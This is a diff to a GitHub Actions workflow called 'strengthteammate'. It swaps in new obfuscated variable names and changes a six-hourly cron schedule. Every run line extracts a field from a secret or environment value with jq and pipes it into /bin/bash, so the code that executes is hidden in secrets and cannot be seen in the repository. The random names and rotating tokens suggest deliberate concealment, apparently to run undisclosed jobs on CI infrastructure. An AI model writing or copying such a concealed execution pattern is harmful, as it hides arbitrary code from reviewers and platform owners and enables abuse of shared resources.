@@ -1,10 +1,8 @@
 name: strengthteammate
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 4/6 * * *'
-
+    - cron: '59 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,16 +11,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: strengthteammate
         env:
-          xcx19: ${{ secrets.xcx19 }}
+          sf96708: ${{ secrets.sf96708 }}
         run: |
-          echo $xcx19 | jq -r .at27 | /bin/bash
-          echo $gfty4 | jq -r .qt364 | /bin/bash
-          echo $r67 | jq -r .fymeu56 | /bin/bash
-          echo $rnjj3 | jq -r .ov2 | /bin/bash
-          echo $j85805 | jq -r .tjw94947 | /bin/bash
-          echo $thbzv5 | jq -r .v23612 | /bin/bash
-          echo $gecl1 | jq -r .sieo0 | /bin/bash
-          echo $lr88 | jq -r .l6 | /bin/bash
-          echo $dgs8 | jq -r .vuk1441 | /bin/bash
-          echo $hzikf6642 | jq -r .sd2491 | /bin/bash
+          echo $sf96708 | jq -r .mk4177 | /bin/bash
+          echo $meovf3688 | jq -r .oafzp018 | /bin/bash
+          echo $orwd3 | jq -r .xz641 | /bin/bash
+          echo $y19 | jq -r .ytps8686 | /bin/bash
+          echo $ndm96394 | jq -r .mz13671 | /bin/bash
+          echo $iz21922 | jq -r .dsmw27 | /bin/bash
 
